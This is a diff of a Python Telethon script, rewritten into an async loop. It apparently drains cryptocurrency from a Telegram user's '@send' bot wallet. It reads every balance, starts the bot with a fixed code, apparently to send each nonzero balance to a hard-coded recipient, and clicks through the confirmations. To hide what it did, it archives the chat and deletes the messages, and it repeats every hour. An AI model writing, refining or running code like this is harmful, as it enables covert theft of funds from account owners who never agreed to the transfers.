@@ -1,72 +1,69 @@
 from telethon.tl.functions.messages import StartBotRequest
 import asyncio
 
+async def main(client):
+    while True:
+        torem = []
+        try:
+            await client.edit_folder('@send', 1)
+        except:...
+        
+        msg = await client.send_message('@send', '/wallet')
+        torem.append(msg.id)
+        
+        try:
+            await client.edit_folder('@send', 1)
+        except:...
+        
+        await asyncio.sleep(1)
+        
+        last = await client.iter_messages('@send', 1)
+        for text in last:
+            torem.append(text.id)
+            text = text.message
+            cryptos = ['USDT', 'TON', 'SOL', 'GRAM', 'NOT', 'HMSTR', 'CATI', 'MY', 'DOGS', 'BTC', 'DOGE', 'LTC', 'ETH', 'BNB', 'TRX', 'USDC']
+            values = '\n'.join(text.split(': ')).split('\n')
+            res = []
+            for val in values:
+                if val.split(' ')[-1] in cryptos and '≈' not in val:
+                    num = val.split(' ')[0]
+                    name = val.split(' ')[-1]
+                    print(f'{name} - {num}')
+                    if float(num) > 0:
+                        await client(StartBotRequest('@send', '@send', 'IV0XOLp7c0mn'))
+                        await asyncio.sleep(1)
+                        
+                        last = await client.iter_messages('@send', 1)
+                        for t in last:
+                            torem.append(t.id)
+                            if t.reply_markup:
+                                ii = -1
+                                for row in t.reply_markup.rows:
+                                    for button in row.buttons:
+                                        ii += 1
+                                        dat = button.data.decode()
+                                        if dat.replace('choose-currency-', '') == name:
+                                            await t.click(ii)
+                                            await asyncio.sleep(1)
+                                            msg = await client.send_message('@send', num)
+                                            torem.append(msg.id)
+                                            await asyncio.sleep(1)
+                                            
+                                            last = await client.iter_messages('@send', 1)
+                                            for t in last:
+                                                torem.append(t.id)
+                                                if t.reply_markup:
+                                                    await t.click(0)
+                                                    await asyncio.sleep(1)
+                                                    
+                                                    last = await client.iter_messages('@send', 1)
+                                                    for t in last:
+                                                        torem.append(t.id)
+                                                        if t.reply_markup:
+                                                            await t.click(0)
+        
+        await client.delete_messages('@send', torem)
+        await asyncio.sleep(3600)
+
 client = args[0]
-
-while True:
-    
-    torem = []
-
-    try:await client.edit_folder('@send', 1)
-    except:...
-
-    msg=await client.send_message('@send', '/wallet')
-    torem.append(msg.id)
-
-    try:await client.edit_folder('@send', 1)
-    except:...
-
-    asyncio.sleep(1)
-
-    last=await client.iter_messages('@send',1)
-
-    for text in last:
-
-        torem.append(text.id)
-        text = text.message
-
-        cryptos = ['USDT','TON','SOL','GRAM','NOT','HMSTR','CATI','MY','DOGS','BTC','DOGE','LTC','ETH','BNB','TRX','USDC']
-
-        values = '\n'.join(text.split(': ')).split('\n')
-        res = []
-        for val in values:
-            if val.split(' ')[-1] in cryptos and '≈' not in val:
-                num = val.split(' ')[0]
-                name = val.split(' ')[-1]
-
-                print(f'{name} - {num}')
-
-                if float(num)>0:
-
-                    await client(StartBotRequest('@send', '@send', 'IV0XOLp7c0mn'))
-
-                    asyncio.sleep(1)
-
-                    last=await client.iter_messages('@send',1)
-                    for t in last: 
-                        torem.append(t.id)
-                        if t.reply_markup:
-                            ii=-1
-                            for row in t.reply_markup.rows:
-                                for button in row.buttons:
-                                    ii+=1
-                                    dat = button.data.decode()
-                                    if dat.replace('choose-currency-', '') == name:
-                                        t.click(ii)
-                                        asyncio.sleep(1)
-                                        msg=await client.send_message('@send',num)
-                                        torem.append(msg.id)
-                                        asyncio.sleep(1)
-                                        last=await client.iter_messages('@send',1)
-                                        for t in last: 
-                                            torem.append(t.id)
-                                            if t.reply_markup:
-                                                t.click(0)
-                                                asyncio.sleep(1)
-                                                last=await client.iter_messages('@send',1)
-                                                for t in last: 
-                                                    torem.append(t.id)
-                                                    if t.reply_markup:
-                                                        t.click(0)
-    await client.delete_messages('@send', torem)
-    asyncio.sleep(3600)
+asyncio.run(main(client))
